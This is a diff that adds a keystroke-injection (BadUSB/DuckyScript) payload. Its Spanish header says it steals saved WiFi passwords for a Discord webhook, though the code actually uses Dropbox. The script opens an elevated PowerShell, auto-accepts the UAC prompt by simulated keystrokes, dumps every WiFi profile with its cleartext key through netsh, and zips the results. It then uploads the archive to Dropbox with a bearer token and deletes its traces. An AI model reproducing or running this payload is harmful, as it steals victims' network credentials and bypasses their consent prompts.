@@ -1,0 +1,22 @@
+REM Description: Roba todas las contraseñas Wifi guardadas y las envía a un webhook de discordia.
+REM Version: 1.0
+REM Category: Passwords
+
+DELAY 750
+WINDOWS d
+DELAY 1500
+WINDOWS r
+DELAY 1500
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 2000
+REM Accept UAC prompt (adjust for language if needed)
+ALT LEFTARROW
+DELAY 1000
+ALT ENTER
+DELAY 2000
+
+REM Wait for elevated PowerShell window to be ready
+DELAY 1000
+STRING $folderDateTime = (Get-Date).ToString('yyyy-MM-dd_HH-mm-ss'); $userDir = (Get-Item env:\userprofile).Value + '\Documents\Networks_' + $folderDateTime; New-Item -Path $userDir -ItemType Directory; netsh wlan show profiles | Select-String ": " | % { $_.ToString().Split(":")[1].Trim() } | % { netsh wlan show profile name=$_ key=clear | Out-File -FilePath ($userDir + '\' + $_ + '.txt') }; Compress-Archive -Path $userDir -DestinationPath ($userDir + '.zip'); Start-Sleep -s 5; Copy-Item -Path ($userDir + '.zip') -Destination 'C:\Users\Public\'; Remove-Item -Path $userDir -Recurse; $hookurl = "https://content.dropboxapi.com/2/files/upload"; $file = "C:\Users\Public\" + ($userDir.Split('\')[-1]) + ".zip"; $headers = @{Authorization = "Bearer YOUR TOKEN DROPBOX";"Content-Type" = "application/octet-stream";"Dropbox-API-Arg" = "{""path"": ""/Networks.zip"", ""mode"": ""add"", ""autorename"": true}"};Invoke-RestMethod -Uri $hookurl -Method Post -Headers $headers -InFile $file; Remove-Item -Path $file;
+ENTER
